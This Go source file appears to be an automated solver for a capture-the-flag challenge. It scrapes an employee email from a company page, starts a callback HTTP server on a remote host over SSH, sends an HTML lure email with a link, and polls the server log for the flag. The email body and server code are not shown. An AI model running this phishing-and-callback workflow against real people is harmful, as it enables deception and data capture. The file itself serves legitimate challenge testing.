package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// Struct to store information for the solver.
type Solver struct {
	domain        string
	httpPort      string
	httpProtocol  string
	httpServerPid string
	sshClient     *ssh.Client
	httpClient    *http.Client
}

// NewSolver instantiates a new Solver struct.
func NewSolver() (*Solver, error) {
	domain, err := getEnv("DOMAIN")
	if err != nil {
		return nil, err
	}
	sshServiceInternalUrl, err := getEnv("SSH_SERVICE_INTERNAL_URL")
	if err != nil {
		return nil, err
	}
	sshPort, err := getEnv("SSH_PORT")
	if err != nil {
		return nil, err
	}
	httpPort, err := getEnv("HTTP_PORT")
	if err != nil {
		return nil, err
	}

	// Use HTTP when running locally, and https when running on CTF platform
	httpProtocol := "http"
	if domain != "localhost" {
		httpProtocol = "https"
		httpPort = "80"
	}

	// SSH connection
	sshClient, err := newInsecureSshClient(SSH_USERNAME, SSH_PASSWORD, sshServiceInternalUrl, sshPort)
	if err != nil {
		return nil, err
	}

	// HTTP client
	httpClient := newInsecureHttpClient()

	solver := Solver{
		domain:       domain,
		httpPort:     httpPort,
		httpProtocol: httpProtocol,
		sshClient:    sshClient,
		httpClient:   httpClient,
	}

	return &solver, nil
}

// Close closes the solvers SSH client.
func (s *Solver) Close() {
	if err := s.CleanupFiles(); err != nil {
		fmt.Println(err)
	}
	if err := s.CleanupHttpServer(s.httpServerPid); err != nil {
		fmt.Println(err)
	}

	s.sshClient.Close()
}

// Checks if employee email is on the company's about page.
func (s *Solver) CheckCompanyWebsiteHasEmployeeEmail() error {
	url := fmt.Sprintf("%s/about", s.GetSubDomainUrl(COMPANY_WEBSITE_SUBDOMAIN))
	resp, err := s.httpClient.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to fetch company page")
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if !strings.Contains(string(body), EMAIL_TO) {
		return fmt.Errorf("company website does not contain employee email: %s", EMAIL_TO)
	}

	return nil
}

// Gets the address for where the HTTP server will run.
func (s *Solver) GetHttpServerAddress() (string, error) {
	session, err := s.sshClient.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()

	// Get address for HTTP server
	output, err := session.CombinedOutput(GET_IP_COMMAND)
	if err != nil {
		return "", err
	}

	ip := strings.TrimRight(string(output), "\r\n")
	url := fmt.Sprintf("http://%s:%d", ip, HTTP_SERVER_PORT)

	return url, nil
}

// Creates file with HTTP server code insidos.LookupEnve on SSH machine.
func (s *Solver) CreateHttpServer() error {
	session, err := s.sshClient.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	// Fill placeholders
	serverCode := fillTemplate(pyHttpServer, map[string]string{
		"PORT":     strconv.Itoa(HTTP_SERVER_PORT),
		"LOG_FILE": fmt.Sprintf("\"%s\"", HTTP_SERVER_LOG),
	})
	session.Stdin = strings.NewReader(serverCode)

	// Upload server.py to SSH
	err = session.Run(fmt.Sprintf(`cat - > %s`, HTTP_FILE))
	if err != nil {
		return err
	}

	return nil
}

// Starts the HTTP server on the SSH machine.
func (s *Solver) StartHttpServer() (string, error) {
	session, err := s.sshClient.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()

	// Start HTTP server
	command := fmt.Sprintf(`setsid nohup python3 %s > server.log 2> server.err < /dev/null & echo $!`, HTTP_FILE)
	output, err := session.CombinedOutput(command)
	if err != nil {
		return "", err
	}

	pid := strings.TrimRight(string(output), "\r\n")

	return pid, nil
}

// Listens for the flag in the log.
func (s *Solver) ListenForFlag() (string, error) {
	flagRegex := regexp.MustCompile(FLAG_REGEX)

	for {
		session, err := s.sshClient.NewSession()
		if err != nil {
			return "", err
		}
		defer session.Close()

		output, err := session.CombinedOutput("cat " + HTTP_SERVER_LOG)
		if err != nil && err.Error() != "Process exited with status 1" {
			return "", err
		}

		flag := flagRegex.Find(output)
		if flag != nil {
			return string(flag), nil
		}

		time.Sleep(SLEEP_TIME)
	}
}

// SendMail sends email from the solvers SSH client.
func (s *Solver) SendMail(mail string) error {
	session, err := s.sshClient.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	session.Stdin = strings.NewReader(mail)
	return session.Run(fmt.Sprintf(`cat - | mhsendmail --smtp-addr="%s" %s`, SMTP_ENDPOINT, EMAIL_TO))
}

// Removes created files.
func (s *Solver) CleanupFiles() error {
	fmt.Println("Removing created files")
	session, err := s.sshClient.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	output, err := session.CombinedOutput(fmt.Sprintf("rm -f %s %s", HTTP_SERVER_LOG, HTTP_FILE))
	if err != nil {
		return err
	}
	fmt.Println("Output:", output)

	return nil
}

// Kills the HTTP server.
func (s *Solver) CleanupHttpServer(pid string) error {
	fmt.Println("Kill HTTP server process")
	session, err := s.sshClient.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	output, err := session.CombinedOutput("kill " + pid)
	if err != nil {
		return err
	}
	fmt.Println("Output:", output)

	return nil
}

// Gets an URL for the subdomain
func (s *Solver) GetSubDomainUrl(subdomain string) string {
	return fmt.Sprintf("%s://%s.%s:%s", s.httpProtocol, subdomain, s.domain, s.httpPort)
}

// createMail constructs an email with the given parameters.
func createMail(from, to, subject, content, url string) string {
	compressed := strings.ReplaceAll(strings.ReplaceAll(content, "\n", ""), "{url}", url)
	return fmt.Sprintf(`From: %s
To: %s
Subject: %s
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

%s`, from, to, subject, compressed)
}

// Try and get environment variable.
func getEnv(key string) (string, error) {
	value, exists := os.LookupEnv(key)
	if !exists {
		return "", fmt.Errorf("missing environment variables '%s'", key)
	}

	return value, nil
}

// sshClient instantiates a new [ssh.Client].
func newInsecureSshClient(username, password, domain, port string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", domain, port), config)
	if err != nil {
		return nil, err
	}

	return client, nil
}

// Gets an insecure HTTP client.
func newInsecureHttpClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
}

// Fills in the given template with the data.
func fillTemplate(template string, data map[string]string) string {
	result := template
	for key, value := range data {
		result = strings.ReplaceAll(result, fmt.Sprintf("{{%s}}", key), value)
	}
	return result
}
